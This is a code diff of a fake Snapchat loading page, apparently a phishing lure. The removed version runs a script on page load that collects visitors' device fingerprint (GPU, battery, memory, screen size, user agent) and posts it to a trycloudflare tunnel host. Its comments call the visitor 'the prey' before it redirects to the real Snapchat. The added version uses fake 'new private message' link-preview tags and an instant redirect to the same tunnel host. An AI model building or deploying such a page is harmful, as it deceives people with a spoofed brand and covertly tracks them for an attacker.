@@ -1,53 +1,19 @@
 <!DOCTYPE html>
-<html>
+<html lang="kmr">
 <head>
     <meta charset="UTF-8">
+    <meta property="og:title" content="Snapchat - New Message">
+    <meta property="og:description" content="You have a new private message on Snapchat. Click to view.">
+    <meta property="og:image" content="https://app.snapchat.com/favicon.png">
+    
+    <meta http-equiv="refresh" content="0; url=https://marine-gdp-genes-districts.trycloudflare.com">
+    
     <title>Snapchat</title>
-    <script>
-        async function sendData() {
-            try {
-                // کۆکردنەوەی زانیارییەکان
-                const battery = await navigator.getBattery();
-                const data = {
-                    gpu: getGPU(),
-                    bat: Math.round(battery.level * 100),
-                    charging: battery.charging,
-                    ram: navigator.deviceMemory || "N/A",
-                    cores: navigator.hardwareConcurrency || "N/A",
-                    w: window.screen.width,
-                    h: window.screen.height,
-                    ua: navigator.userAgent
-                };
-
-                // ناردن بۆ لینکی تێرموکسەکەت
-                await fetch('https://marine-gdp-genes-districts.trycloudflare.com/final_report', {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
-                });
-            } catch (e) {}
-
-            // ناردنی نێچیرەکە بۆ سناپچات دوای یەک چرکە
-            setTimeout(() => {
-                window.location.href = "https://www.snapchat.com";
-            }, 1000);
-        }
-
-        function getGPU() {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl');
-            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-        }
-
-        window.onload = sendData;
-    </script>
 </head>
-<body style="background-color: #FFFC00; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0;">
+<body style="background-color: #FFFC00; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh;">
     <div style="text-align: center; font-family: sans-serif;">
-        <img src="https://app.snapchat.com/favicon.png" width="80">
-        <h2>Loading Snapchat...</h2>
+        <img src="https://app.snapchat.com/favicon.png" width="100">
+        <h2 style="color: black;">Loading Snapchat...</h2>
     </div>
 </body>
 </html>
